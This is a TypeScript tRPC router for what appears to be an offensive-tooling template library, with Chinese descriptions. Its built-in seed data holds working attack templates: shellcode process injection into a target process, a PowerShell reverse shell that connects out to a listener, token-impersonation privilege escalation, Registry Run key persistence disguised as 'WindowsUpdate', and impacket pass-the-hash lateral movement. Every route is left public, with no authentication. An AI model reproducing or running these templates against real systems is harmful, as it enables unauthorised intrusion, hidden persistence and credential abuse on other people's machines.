import { z } from "zod";
import { publicProcedure, router } from "../_core/trpc";
import { getDb } from "../db";
import { templates, templateVersions } from "../../drizzle/schema";
import { eq, desc } from "drizzle-orm";

export const templatesRouter = router({
  list: publicProcedure
    .input(z.object({
      category: z.string().optional(),
      platform: z.string().optional(),
      language: z.string().optional(),
      search: z.string().optional(),
    }).optional())
    .query(async ({ input }) => {
      const db = await getDb();
      if (!db) return [];
      try {
        const rows = await db.select().from(templates).orderBy(desc(templates.updatedAt));
        return rows.filter(t => {
          if (input?.category && t.category !== input.category) return false;
          if (input?.platform && t.platform !== input.platform) return false;
          if (input?.language && t.language !== input.language) return false;
          if (input?.search) {
            const s = input.search.toLowerCase();
            return t.name.toLowerCase().includes(s) || (t.description ?? "").toLowerCase().includes(s);
          }
          return true;
        });
      } catch { return []; }
    }),

  get: publicProcedure
    .input(z.object({ id: z.number() }))
    .query(async ({ input }) => {
      const db = await getDb();
      if (!db) return null;
      try {
        const rows = await db.select().from(templates).where(eq(templates.id, input.id)).limit(1);
        return rows[0] ?? null;
      } catch { return null; }
    }),

  create: publicProcedure
    .input(z.object({
      name: z.string().min(1),
      description: z.string().optional(),
      category: z.enum(["injection", "privilege_escalation", "lateral_movement", "persistence", "recon", "evasion", "other"]),
      platform: z.string().optional(),
      language: z.string().optional(),
      mitreAttack: z.array(z.string()).optional(),
      codeTemplate: z.string().optional(),
      parameters: z.array(z.object({
        name: z.string(),
        type: z.string(),
        description: z.string(),
        defaultValue: z.string().optional(),
      })).optional(),
      tags: z.array(z.string()).optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      const db = await getDb();
      if (!db) throw new Error("DB unavailable");
      const ownerId = (ctx.user as any)?.id ?? 1;
      const [result] = await db.insert(templates).values({
        ...input,
        ownerId,
        isBuiltin: false,
        version: 1,
        tags: input.tags ?? [],
        mitreAttack: input.mitreAttack ?? [],
        parameters: input.parameters ?? [],
      });
      return { id: (result as any).insertId };
    }),

  update: publicProcedure
    .input(z.object({
      id: z.number(),
      name: z.string().optional(),
      description: z.string().optional(),
      codeTemplate: z.string().optional(),
      parameters: z.array(z.object({
        name: z.string(),
        type: z.string(),
        description: z.string(),
        defaultValue: z.string().optional(),
      })).optional(),
      changelog: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB unavailable");
      const { id, changelog, ...data } = input;
      // Save version history
      const rows = await db.select().from(templates).where(eq(templates.id, id)).limit(1);
      if (rows[0]) {
        await db.insert(templateVersions).values({
          templateId: id,
          version: rows[0].version,
          codeTemplate: rows[0].codeTemplate ?? undefined,
          parameters: rows[0].parameters ?? [],
          changelog: changelog ?? "Updated",
        });
        await db.update(templates).set({ ...data, version: rows[0].version + 1 }).where(eq(templates.id, id));
      }
      return { success: true };
    }),

  delete: publicProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ input }) => {
      const db = await getDb();
      if (!db) throw new Error("DB unavailable");
      await db.delete(templates).where(eq(templates.id, input.id));
      return { success: true };
    }),

  getVersions: publicProcedure
    .input(z.object({ templateId: z.number() }))
    .query(async ({ input }) => {
      const db = await getDb();
      if (!db) return [];
      try {
        return await db.select().from(templateVersions)
          .where(eq(templateVersions.templateId, input.templateId))
          .orderBy(desc(templateVersions.version));
      } catch { return []; }
    }),

  seedBuiltin: publicProcedure.mutation(async ({ ctx }) => {
    const db = await getDb();
    if (!db) throw new Error("DB unavailable");
    const ownerId = (ctx.user as any)?.id ?? 1;

    const builtins = [
      {
        name: "Process Injection - Classic",
        description: "经典进程注入模板，支持 OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread",
        category: "injection" as const,
        platform: "windows",
        language: "c",
        mitreAttack: ["T1055"],
        codeTemplate: `#include <windows.h>
#include <stdio.h>

// {{SHELLCODE_PLACEHOLDER}}
unsigned char shellcode[] = { {{SHELLCODE_BYTES}} };

int main() {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {{TARGET_PID}});
    if (!hProcess) return 1;
    
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), 
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                         (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}`,
        parameters: [
          { name: "TARGET_PID", type: "number", description: "目标进程PID", defaultValue: "1234" },
          { name: "SHELLCODE_BYTES", type: "string", description: "Shellcode字节序列", defaultValue: "0x90, 0x90" },
        ],
        tags: ["injection", "windows", "classic"],
        isBuiltin: true,
        version: 1,
        ownerId,
      },
      {
        name: "Reverse Shell - PowerShell",
        description: "PowerShell 反弹Shell，支持AMSI绕过",
        category: "other" as const,
        platform: "windows",
        language: "powershell",
        mitreAttack: ["T1059.001"],
        codeTemplate: `$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}", {{LPORT}});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
};
$client.Close()`,
        parameters: [
          { name: "LHOST", type: "string", description: "监听IP地址", defaultValue: "192.168.1.100" },
          { name: "LPORT", type: "number", description: "监听端口", defaultValue: "4444" },
        ],
        tags: ["reverse_shell", "powershell", "windows"],
        isBuiltin: true,
        version: 1,
        ownerId,
      },
      {
        name: "Privilege Escalation - Token Impersonation",
        description: "令牌模拟提权，利用SeImpersonatePrivilege",
        category: "privilege_escalation" as const,
        platform: "windows",
        language: "c",
        mitreAttack: ["T1134.001"],
        codeTemplate: `#include <windows.h>
#include <stdio.h>

BOOL ImpersonateSystem() {
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    
    // Find SYSTEM process
    // {{FIND_SYSTEM_PROCESS}}
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        return FALSE;
    
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, 
                          SecurityImpersonation, TokenImpersonation, &hDupToken))
        return FALSE;
    
    return ImpersonateLoggedOnUser(hDupToken);
}`,
        parameters: [],
        tags: ["privesc", "token", "windows"],
        isBuiltin: true,
        version: 1,
        ownerId,
      },
      {
        name: "Persistence - Registry Run Key",
        description: "注册表Run键持久化",
        category: "persistence" as const,
        platform: "windows",
        language: "c",
        mitreAttack: ["T1547.001"],
        codeTemplate: `#include <windows.h>

void AddPersistence(const char* payloadPath) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, 
                  "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "{{REG_KEY_NAME}}", 0, REG_SZ, 
                   (BYTE*)payloadPath, strlen(payloadPath) + 1);
    RegCloseKey(hKey);
}`,
        parameters: [
          { name: "REG_KEY_NAME", type: "string", description: "注册表键名", defaultValue: "WindowsUpdate" },
        ],
        tags: ["persistence", "registry", "windows"],
        isBuiltin: true,
        version: 1,
        ownerId,
      },
      {
        name: "Lateral Movement - SMB Pass-the-Hash",
        description: "SMB哈希传递横向移动",
        category: "lateral_movement" as const,
        platform: "windows",
        language: "python",
        mitreAttack: ["T1550.002"],
        codeTemplate: `from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, SAMHashes

def pass_the_hash(target, username, lm_hash, nt_hash):
    """
    Pass-the-Hash via SMB
    Target: {{TARGET_HOST}}
    Domain: {{DOMAIN}}
    """
    smb = SMBConnection("{{TARGET_HOST}}", "{{TARGET_HOST}}")
    smb.login("{{USERNAME}}", "", "{{DOMAIN}}", lm_hash, nt_hash)
    return smb`,
        parameters: [
          { name: "TARGET_HOST", type: "string", description: "目标主机IP", defaultValue: "192.168.1.10" },
          { name: "DOMAIN", type: "string", description: "域名", defaultValue: "WORKGROUP" },
          { name: "USERNAME", type: "string", description: "用户名", defaultValue: "Administrator" },
        ],
        tags: ["lateral_movement", "smb", "pth"],
        isBuiltin: true,
        version: 1,
        ownerId,
      },
    ];

    for (const t of builtins) {
      const existing = await db.select().from(templates).where(eq(templates.name, t.name)).limit(1);
      if (!existing[0]) {
        await db.insert(templates).values(t);
      }
    }
    return { success: true, count: builtins.length };
  }),
});
